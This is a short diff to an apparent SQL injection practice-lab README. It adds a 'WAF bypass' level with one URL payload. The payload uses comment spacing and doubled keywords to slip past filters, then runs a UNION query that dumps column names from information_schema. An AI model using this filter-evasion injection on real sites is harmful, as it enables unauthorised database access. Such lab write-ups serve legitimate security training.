@@ -1,5 +1,10 @@
 # [MAIN PAGE](http://root0x00.altervista.org/sqli/)
 
+## WAF BYPASS LEVEL 3 MEDIUM~MEDIUM
+```
+http://root0x00.altervista.org/sqli/level1.php?id=11%27/**/Ununionion/**/seselectlect/**/1,2,3,4,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=%27BlueMilkshake_0
+```
+
 ## XPATH LEVEL 1
 
 ```
